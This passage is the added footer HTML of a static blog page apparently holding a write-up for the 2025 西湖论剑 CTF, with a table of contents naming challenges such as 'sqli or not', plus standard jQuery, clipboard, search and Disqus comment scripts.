+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Rank-I-SV"><span class="toc-number">1.</span> <span class="toc-text">Rank-I | SV</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-or-not-%E5%A4%8D%E4%B9%A0"><span class="toc-number">2.</span> <span class="toc-text">sqli or not | 复习</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rank-U-%E5%A4%8D%E4%B9%A0"><span class="toc-number">3.</span> <span class="toc-text">Rank-U | 复习</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Summary"><span class="toc-number">4.</span> <span class="toc-text">Summary</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Rank-I"><span class="toc-number">4.1.</span> <span class="toc-text">Rank-I</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqli-or-not"><span class="toc-number">4.2.</span> <span class="toc-text">sqli or not</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Rank-U"><span class="toc-number">4.3.</span> <span class="toc-text">Rank-U</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ref"><span class="toc-number">5.</span> <span class="toc-text">Ref</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2025/01/20/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2025/01/20/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025/&text=西湖论剑2025"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2025/01/20/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025/&title=西湖论剑2025"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2025/01/20/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025/&is_video=false&description=西湖论剑2025"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=西湖论剑2025&body=Check out this article: https://kc1zs4.github.io/2025/01/20/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2025/01/20/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025/&title=西湖论剑2025"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2025/01/20/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025/&title=西湖论剑2025"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2025/01/20/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025/&title=西湖论剑2025"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2025/01/20/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025/&title=西湖论剑2025"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2025/01/20/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025/&name=西湖论剑2025&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2025/01/20/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025/&t=西湖论剑2025"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    KC1zs4&#39;s Blog
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+  
+<script src="/js/search.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+
+    var $inputArea = $("input#search-input");
+    var $resultArea = document.querySelector("div#search-result");
+
+    $inputArea.focus(function() {
+      var search_path = "search.xml";
+      if (search_path.length == 0) {
+        search_path = "search.xml";
+      }
+      var path = "/" + search_path;
+      searchFunc(path, 'search-input', 'search-result');
+    });
+
+    $inputArea.keydown(function(e) {
+      if (e.which == 13) {
+        e.preventDefault();
+      }
+    });
+
+    var observer = new MutationObserver(function(mutationsList, observer) {
+      if (mutationsList.length == 1) {
+        if (mutationsList[0].addedNodes.length) {
+          $(".search-no-result").hide();
+        } else if (mutationsList[0].removedNodes.length) {
+          $(".search-no-result").show(200);
+        }
+      }
+    });
+
+    observer.observe($resultArea, { childList: true });
+
+  });
+  </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'kc1zs4-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
